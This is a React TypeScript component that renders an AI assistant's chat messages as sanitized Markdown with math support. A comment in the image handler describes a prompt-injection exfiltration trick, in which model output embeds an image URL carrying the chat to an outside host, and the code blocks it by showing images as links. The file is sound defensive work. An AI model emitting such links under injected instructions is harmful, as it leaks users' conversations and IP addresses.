import type { ReactNode } from "react";
// KaTeX's stylesheet travels with the renderer (PERF-24): this module loads on demand, not on every page.
import "katex/dist/katex.min.css";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkMath from "remark-math";
import rehypeKatex from "rehype-katex";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import { cn } from "@/lib/utils";

export type ChatMessageContentVariant = "assistant" | "user";

interface ChatMessageContentProps {
  content: string;
  variant?: ChatMessageContentVariant;
  isWhiteLab?: boolean;
  className?: string;
}

const sanitizeSchema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    a: [...(defaultSchema.attributes?.a ?? []), ["href", /^https?:\/\//]],
  },
};

function SafeLink({ href, children }: { href?: string; children: ReactNode }) {
  if (!href || !/^https?:\/\//i.test(href)) {
    return <span>{children}</span>;
  }
  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className="font-medium text-indigo-500 underline underline-offset-2 hover:text-indigo-400 dark:text-indigo-300 dark:hover:text-indigo-200"
    >
      {children}
    </a>
  );
}

const assistantComponents: Components = {
  a: ({ href, children }) => <SafeLink href={href}>{children}</SafeLink>,
  // Never auto-load images named by model output: a prompt-injected `![](https://host/?q=<chat>)` would
  // leak the conversation and the viewer's IP to that host (SEC-15). Shown as a link the user may follow.
  img: ({ src, alt }) => (
    <SafeLink href={typeof src === "string" ? src : undefined}>{alt ? `[image: ${alt}]` : "[image]"}</SafeLink>
  ),
  code: ({ className, children, ...props }) => {
    const isFenced = Boolean(className?.startsWith("language-"));
    if (!isFenced) {
      return (
        <code
          className="rounded px-1 py-0.5 font-mono text-[0.85em] bg-black/10 dark:bg-white/10"
          {...props}
        >
          {children}
        </code>
      );
    }
    return (
      <code className={cn("block font-mono text-[0.8em]", className)} {...props}>
        {children}
      </code>
    );
  },
  pre: ({ children }) => (
    <pre className="my-2 overflow-x-auto rounded-lg border border-black/10 bg-black/5 px-3 py-2 text-[0.8em] dark:border-white/10 dark:bg-black/30">
      {children}
    </pre>
  ),
};

export function ChatMessageContent({
  content,
  variant = "assistant",
  isWhiteLab = false,
  className,
}: ChatMessageContentProps) {
  if (variant === "user") {
    return (
      <p className={cn("whitespace-pre-wrap break-words text-inherit", className)}>{content}</p>
    );
  }

  const themeClass = isWhiteLab ? "chat-markdown--light" : "chat-markdown--dark";

  return (
    <div className={cn("chat-markdown", themeClass, className)}>
      <ReactMarkdown
        remarkPlugins={[remarkMath]}
        rehypePlugins={[rehypeKatex, [rehypeSanitize, sanitizeSchema]]}
        components={assistantComponents}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}
